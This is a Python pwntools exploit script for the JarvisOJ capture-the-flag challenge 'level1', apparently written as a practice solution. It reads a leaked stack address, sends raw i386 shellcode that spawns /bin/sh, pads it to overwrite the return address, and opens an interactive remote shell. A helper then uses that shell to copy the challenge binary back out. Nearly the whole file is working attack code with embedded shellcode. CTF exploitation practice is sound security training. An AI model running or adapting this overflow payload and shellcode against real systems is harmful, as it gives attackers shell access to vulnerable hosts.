#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import os, sys

DEBUG = 3
context.arch = "i386"
#context.log_level = "debug"
elf = ELF("./level1",checksec=False)

# synonyms for faster typing
tube.s = tube.send
tube.sl = tube.sendline
tube.sa = tube.sendafter
tube.sla = tube.sendlineafter
tube.r = tube.recv
tube.ru = tube.recvuntil
tube.rl = tube.recvline
tube.ra = tube.recvall
tube.rr = tube.recvregex
tube.irt = tube.interactive

if DEBUG == 1:
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
	s = process("./level1")
elif DEBUG == 2:
	libc = ELF("./libc.so.6",checksec=False)
	s = process("./level1", env={"LD_PRELOAD":"./libc.so.6"})
elif DEBUG == 3:
	#libc = ELF("./libc.so.6",checksec=False)
	ip = "pwn2.jarvisoj.com" 
	port = 9877
	s = remote(ip,port)

def z(addr):
    raw_input("debug?")
    gdb.attach(s, "b *" + str(addr))

wordSz = 4
hwordSz = 2
bits = 32
PIE = 0
mypid=0
def leak(address, size):
   with open("/proc/%s/mem" % mypid) as mem:
      mem.seek(address)
      return mem.read(size)

def findModuleBase(pid, mem):
   name = os.readlink("/proc/%s/exe" % pid)
   with open("/proc/%s/maps" % pid) as maps:
      for line in maps:
         if name in line:
            addr = int(line.split("-")[0], 16)
            mem.seek(addr)
            if mem.read(4) == "\x7fELF":
               bitFormat = u8(leak(addr + 4, 1))
               if bitFormat == 2:
                  global wordSz
                  global hwordSz
                  global bits
                  wordSz = 8
                  hwordSz = 4
                  bits = 64
               return addr
   log.failure("Module's base address not found.")
   sys.exit(1)

def zx(addr = 0):
    global mypid
    mypid = proc.pidof(s)[0]
    raw_input("debug?")
    with open("/proc/%s/mem" % mypid) as mem:
        moduleBase = findModuleBase(mypid, mem)
        gdb.attach(s, "set follow-fork-mode parent\nb *" + hex(moduleBase+addr))

def pwn():
   s.ru("What's this:0x")
   stack = int(s.rl().strip()[:-1], 16)
   info("stack 0x%x", stack)

   #z(0x080484B1)
   sh = "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
   #sh = asm(shellcraft.i386.linux.sh())
   payload = sh.ljust(0x8c, "A")
   payload += p32(stack)
   s.s(payload)

   s.irt()

def dump():
	pwn()
	s.recv(timeout=1)
	s.sl("cat level1")
	s.sl("exit")
	data = s.ra()
	f = open("dump", "wb")
	f.write(data)
	f.close()

if __name__ == "__main__":
    pwn()